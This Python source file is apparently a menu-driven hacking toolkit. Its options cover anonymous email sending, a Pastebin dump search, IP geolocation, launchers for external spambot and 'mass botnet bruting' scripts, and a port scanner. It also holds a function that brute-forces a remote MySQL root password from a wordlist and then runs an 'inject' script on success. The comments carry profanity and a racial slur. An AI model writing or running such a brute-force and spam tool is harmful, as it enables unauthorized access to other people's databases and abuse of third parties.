import os
import webbrowser
import sys
import time
import socket
import smtplib
import getpass
import re
import requests
from sys import stdout
#╔═╗╔╗╔╔═╗╔╗╔  ╔═╗╔╦╗╔═╗╦╦    ╔═╗╔═╗╔╗╔╔╦╗
#╠═╣║║║║ ║║║║  ║╣ ║║║╠═╣║║    ╚═╗║╣ ║║║ ║║
#╩ ╩╝╚╝╚═╝╝╚╝  ╚═╝╩ ╩╩ ╩╩╩═╝  ╚═╝╚═╝╝╚╝═╩╝                                                                                                                                                  
#ANON EMAIL SENDER                                                          
def anon_mail_sender():
    to_email_input = input("Persons Email: ")
    subject_to_send = input("Emails Subject: ")
    message_to_send = input("Message: ")

    user_agent = 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
    sess = requests.Session()
    email_req = sess.post('http://anonymouse.org/cgi-bin/anon-email.cgi', headers={
    	'Host': 'anonymouse.org',
    	'User-Agent': user_agent,
    	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    	'Accept-Language': 'en-US,en;q=0.5',
    	'Accept-Encoding': 'gzip, deflate',
	    'Referer': 'http://anonymouse.org/anonemail.html',
            'Connection': 'close',
            'Upgrade-Insecure-Requests':'1',
            'Content-Type':'application/x-www-form-urlencoded'
    }, data={
    	'to': to_email_input,
    	'subject': subject_to_send,
    	'text': message_to_send
    })

    if 'The e-mail has been sent' in email_req.text:
        print("Email sent, it will be randomly delayed up to 12 hours")
    print()
    paste_restart_script = input("would you like to repeat menu? (y/n):")
    if paste_restart_script == "y":
        os.system("python3 tool.py")
    elif paste_restart_script == "n":
        print("Exiting....")
        exit
    else:
        print("Not Vaild Input Or An Unkown Error Has Occured")





#╔═╗╔═╗╔═╗╔╦╗╔═╗╔╗ ╦╔╗╔  ╦  ╔═╗╔═╗╦╔═╦ ╦╔═╗
#╠═╝╠═╣╚═╗ ║ ║╣ ╠╩╗║║║║  ║  ║ ║║ ║╠╩╗║ ║╠═╝
#╩  ╩ ╩╚═╝ ╩ ╚═╝╚═╝╩╝╚╝  ╩═╝╚═╝╚═╝╩ ╩╚═╝╩  
##PASTE BIN SCRAPER
def paste_scrape():
    main_usr_input = input("Search Term: ")

    response = requests.get("https://psbdmp.ws/api/search/" + main_usr_input)
    data = response.json()
    os.system("clear")
    print("Matches Found: ")
    print()
    s4y = data["count"]
    print("s4y")
    print()
    print("Searched For: " + data["search"])
    print()
    num = 0
    while num < s4y:
        print("[https://pastebin.com/" + data['data'][num]['id'] + "] " + "[Date Posted: " + data['data'][num]['time'] + "]" + " [Tags:" + data['data'][num]['tags'] + "]")
        num = num + 1
    print()
    paste_restart_script = input("would you like to repeat menu? (y/n):")
    if paste_restart_script == "y":
        os.system("python3 tool.py")
    elif paste_restart_script == "n":
        print("Exiting....")
        exit
    else:
        print("Not Vaild Input Or An Unkown Error Has Occured")



#╔═╗╔╗╔╔═╗  ╔═╗╦ ╦╔═╗╦╔═╔═╗╦═╗
#║  ║║║║    ╠╣ ║ ║║  ╠╩╗║╣ ╠╦╝
#╚═╝╝╚╝╚═╝  ╚  ╚═╝╚═╝╩ ╩╚═╝╩╚═
##CNC FUCKER
def CNC_fuck():
    print("Usage: python cncfuck.py <cnc_ip> <cnc_port>")


#╦╔═╗  ╦  ╔═╗╔═╗╦╔═╦ ╦╔═╗
#║╠═╝  ║  ║ ║║ ║╠╩╗║ ║╠═╝
#╩╩    ╩═╝╚═╝╚═╝╩ ╩╚═╝╩                                               
#who is lookup
def whois():
    whois_input = input("IP: ")
    response2 = requests.get("http://ip-api.com/json/" + whois_input)
    data1 = response2.json()
    whois_status = data1["status"]
    whois_country = data1["country"]
    whois_count_code = data1["countryCode"]
    whois_region = data1["region"]
    whois_regionName = data1["regionName"]
    whois_city = data1["city"]
    whois_zip = data1["zip"]
    whois_lat = str(data1["lat"])
    whois_lon = str(data1["lon"])
    whois_timezone = str(data1["timezone"])
    whois_isp = data1["isp"]
    whois_org = data1["org"]
    print()
    print("[Status: " + whois_status + "]")
    print("[Country: " + whois_country + "]")
    print("[Country Code: " + whois_count_code + "]")
    print("[Region: " + whois_region + "]")
    print("[Region Name: " + whois_regionName + "]")
    print("[City: " + whois_city + "]")
    print("[Zip: " + whois_zip + "]")
    print("[Lat: " + str(whois_lat) + "]")
    print("[Lon: " + whois_lon + "]")
    print("[Timezone: " + whois_timezone + "]")
    print("[ISP: " + whois_isp + "]")
    print("[Org: " + whois_org + "]")
    print()
    paste_restart_script = input("would you like to repeat menu? (y/n):")
    if paste_restart_script == "y":
        os.system("python3 tool.py")
    elif paste_restart_script == "n":
        print("Exiting....")
        exit
    else:
        print("Not Vaild Input Or An Unkown Error Has Occured")


 
#╔═╗╔═╗╔═╗╔╦╗  ╔╗ ╔═╗╔╦╗
#╚═╗╠═╝╠═╣║║║  ╠╩╗║ ║ ║ 
#╚═╝╩  ╩ ╩╩ ╩  ╚═╝╚═╝ ╩                                                                         
#spambot 
def spam_bot():
    os.system("CScript spambot.vbs")
    paste_restart_script = input("would you like to repeat menu? (y/n):")
    if paste_restart_script == "y":
        os.system("python3 tool.py")
    elif paste_restart_script == "n":
        print("Exiting....")
        exit

        
#╔╦╗╔═╗╔═╗╔═╗  ╔╗ ╔═╗╔╦╗╔╗╔╔═╗╔╦╗  ╔╗ ╦═╗╦ ╦╔╦╗╔═╗
#║║║╠═╣╚═╗╚═╗  ╠╩╗║ ║ ║ ║║║║╣  ║   ╠╩╗╠╦╝║ ║ ║ ║╣ 
#╩ ╩╩ ╩╚═╝╚═╝  ╚═╝╚═╝ ╩ ╝╚╝╚═╝ ╩   ╚═╝╩╚═╚═╝ ╩ ╚═╝
#mass email sender 
def mass_botnet_brute():
    os.system("node main.js")
    paste_restart_script = input("would you like to repeat menu? (y/n):")
    if paste_restart_script == "y":
        os.system("python3 tool.py")
    elif paste_restart_script == "n":
        print("Exiting....")
        exit

#╔═╗╔═╗╦═╗╔╦╗╔═╗╔═╗╔═╗╔╗╔
#╠═╝║ ║╠╦╝ ║ ╚═╗║  ╠═╣║║║
#╩  ╚═╝╩╚═ ╩ ╚═╝╚═╝╩ ╩╝╚╝
#FAST ASS PORTSCANNER NIGGAAA
def fast_portscanner():
    os.system("python portscan.py")
    paste_restart_script = input("would you like to repeat menu? (y/n):")
    if paste_restart_script == "y":
        os.system("python3 tool.py")
    elif paste_restart_script == "n":
        print("Exiting....")
        exit

#a lil extra shit :D
def single_brute():
    botnet_ip = input("IP:")

    open_file = open('passwords.txt', 'r')
    lines = open_file.readlines()


    for line in lines:
        try:
          string = line.rstrip('\r\n')
          os_cmd = 'mysql -u root -p'+ string +' -h '+ botnet_ip +' -e "SHOW DATABASES;"'
          if os.system(os_cmd) != 0:
              raise Exception('error')
        except:
          os.system("cls")
          print("Unable To Make Connection Server Using Password:" + string)
        else:
          print("Looks Like We Got The Password: "+string)
          os.system("bash inject")
    os.system("python3 tool.py")
#MAIN
#FUCKING
#MENU

print()
print("╔═╗╔╦╗╦═╗╔═╗╔═╗╔═╗ ╔═╗╦╔╦╗╦ ╦")
print("╚═╗ ║ ╠╦╝║╣ ╚═╗╚═╗ ║  ║ ║ ╚╦╝")
print("╚═╝ ╩ ╩╚═╚═╝╚═╝╚═╝o╚═╝╩ ╩  ╩ ")
print()
print("1 ~ Anon Email Send.")
print("2 ~ Pastebin Scrape.")
print("3 ~ CNC Crasher.")
print("4 ~ Ip Look Up.")
print("5 ~ SpamBot.   ")
print("6 ~ Mass botnet bruting.")
print("7 ~ Portscan A IP.")
print("8 ~ Single Brute")
print("")
print("0] Exit Script")
print()

menu_input = input("@tool~")
if menu_input == "1":
    anon_mail_sender()

elif menu_input == "2":
    paste_scrape()

elif menu_input == "3":
    CNC_fuck()

elif menu_input == "4":
    whois()

elif menu_input == "5":
    spam_bot()

elif menu_input == "6":
    mass_botnet_brute()

elif menu_input == "7":
    fast_portscanner()

elif menu_input == "8":
    single_brute()

elif menu_input == "0":
    exit
else:
    os.system("python3 tool.py")